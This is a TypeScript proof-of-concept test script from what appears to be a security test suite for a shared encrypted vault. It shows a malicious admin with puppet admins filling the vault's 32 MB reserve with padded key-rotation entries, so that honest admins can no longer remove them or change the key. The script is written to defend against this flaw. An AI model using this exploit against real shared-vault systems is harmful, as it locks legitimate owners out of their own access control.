// @ts-nocheck PoC script, run as is by the round-5 tests
// T2 (S5 residual): a malicious admin M (or a thief on a personal-vault phone before removal)
// with 4 puppet admins fills the vault-wide reserve (32 MB) with applied key.rotate entries whose
// prevKey ciphertext is ~120 KB of padding (prevKey.ct has no size limit and replay never opens
// it). Every attacker line passes the honest agent's quota check. Afterwards the honest admin's
// removal of M, a key change, and a phrase restore are all refused: M can never be removed.
// PASS = the attack step worked.
import { addDevice, build, check, dev, entry, found, now, open, random, st } from './lib';
import { tempStore } from './agentlib';
const { quotaProblem, VAULT_RESERVE, RESERVE_PER_IDENTITY } = await import(new URL('../../../src/vaultQuota.ts', import.meta.url).href);
const T = tempStore('t2');
try {
  const A = dev(), B = dev(), M = dev();
  const P = [dev(), dev(), dev(), dev()];
  const v = found(A, 'team');
  const id = v.vaultId;
  addDevice(id, v.logs, A, B, 'admin');
  addDevice(id, v.logs, A, M, 'admin');
  for (const p of P) addDevice(id, v.logs, M, p, 'admin');
  const base = st(id, v.logs);
  let key = open.openVault(base, M).currentKey;
  const attackers = [M, ...P];
  const heads: Record<string, any> = { ...base.heads };
  const applied: Record<string, any> = { ...base.appliedHeads };
  let epoch = base.epoch;
  const per = Math.floor((VAULT_RESERVE.bytes - 64 * 1024) / attackers.length); // aim just under 32 MB total
  const used: Record<string, number> = {};
  const fat = (author: any, padChars: number) => {
    const fake = { ...base, epoch, heads, appliedHeads: applied };
    const r = build.buildKeyRotate(fake, author, { currentKey: key, random, time: now() });
    const { sig, ...unsigned } = r.entry as any;
    unsigned.body = { ...unsigned.body, prevKey: { ...unsigned.body.prevKey, ct: 'A'.repeat(padChars) } };
    const e = entry.signEntry(unsigned, author);
    const h = { seq: e.seq, hash: entry.entryHash(e), time: e.time };
    heads[author.deviceId] = h; applied[author.deviceId] = h;
    epoch += 1; key = r.newKey;
    v.logs[author.deviceId]!.push(entry.serializeEntry(e));
    used[author.deviceId] = (used[author.deviceId] ?? 0) + entry.serializeEntry(e).length + 1;
    return e;
  };
  let lines = 0;
  for (const a of attackers) {
    while ((used[a.deviceId] ?? 0) + 125_000 < Math.min(per, RESERVE_PER_IDENTITY.bytes)) { fat(a, 120_000); lines++; }
  }
  // Top up to just under the vault-wide reserve, counting reserved bytes the way vaultQuota does.
  const reservedBytes = () => {
    const s0 = st(id, v.logs);
    const status = new Map(s0.history.map((h: any) => [h.hash, h]));
    let total = 0;
    for (const [who, hashes] of Object.entries(s0.chains) as [string, string[]][]) hashes.forEach((h, i) => {
      const it: any = status.get(h);
      if (it?.status === 'applied' && ['device.hello', 'device.remove', 'key.rotate', 'recovery.set'].includes(it.kind)) total += Buffer.byteLength(v.logs[who]![i]!, 'utf8') + 1;
    });
    return total;
  };
  const last = attackers.at(-1)!;
  let slack = VAULT_RESERVE.bytes - reservedBytes();
  // Stops once a padded line no longer counts toward the reserve (a fixed core refuses it).
  for (let previous = Infinity; slack > 125_000 && slack < previous; ) { previous = slack; fat(last, 120_000); lines++; slack = VAULT_RESERVE.bytes - reservedBytes(); }
  const probe = fat(last, 1000); v.logs[last.deviceId]!.pop(); epoch -= 1; // size of a rotation with 1000 pad chars
  const sizeAt1000 = Buffer.byteLength(entry.serializeEntry(probe), 'utf8') + 1;
  // fat() moved heads/key; rebuild cleanly by replaying the probe's effect away.
  heads[last.deviceId] = st(id, v.logs).heads[last.deviceId]; applied[last.deviceId] = heads[last.deviceId];
  let pad = 1000 + (slack - sizeAt1000) - 300; pad -= pad % 4;
  key = open.openVault(st(id, v.logs), M).currentKey; epoch = st(id, v.logs).epoch;
  fat(last, pad); lines++;
  console.log(`slack before top-up ${slack} bytes; top-up pad ${pad}; reserved now ${reservedBytes()} of ${VAULT_RESERVE.bytes}`);
  // Hold the attacker's last lines back, to show the honest agent takes them.
  const held = v.logs[last.deviceId]!.splice(-3).map((l) => JSON.parse(l));
  T.writeFolder(id, v.logs);
  let heldTaken = true;
  try { T.store.append(id, held, false); } catch (err) { heldTaken = false; console.log(`the agent refused the attacker's last batch: ${(err as Error).message}`); }
  check('the honest agent takes the attacker\'s padded key changes', heldTaken);
  console.log(`attacker wrote ${lines} key.rotate lines (~${Math.round(lines * 120 / 1024)} MB)`);
  const s = st(id, T.readFolder(id));
  const hist = new Map(s.history.map((h: any) => [h.hash, h.status]));
  const rot = s.history.filter((h: any) => h.kind === 'key.rotate');
  console.log(`key.rotate applied: ${rot.filter((h: any) => h.status === 'applied').length}/${rot.length}; epoch ${s.epoch}`);
  // Honest admin A: remove M.
  const keyA = open.openVault(s, A).currentKey;
  const tries: [string, any][] = [
    ['A removes M', build.buildDeviceRemove(s, A, { device: M.deviceId, currentKey: keyA, random, time: now() }).entry],
    ['A rotates the key', build.buildKeyRotate(s, A, { currentKey: keyA, random, time: now() }).entry],
    ['B removes M', build.buildDeviceRemove(s, B, { device: M.deviceId, currentKey: open.openVault(s, B).currentKey, random, time: now() }).entry],
  ];
  let allRefused = true;
  for (const [label, e] of tries) {
    let out = 'accepted';
    try { T.store.append(id, [e], false); } catch (err) { out = `REFUSED: ${(err as Error).message}`; }
    if (out === 'accepted') allRefused = false;
    console.log(`${label}: ${out}`);
  }
  check('the honest admins can no longer remove the malicious admin or change the key', allRefused);
} finally { T.cleanup(); }
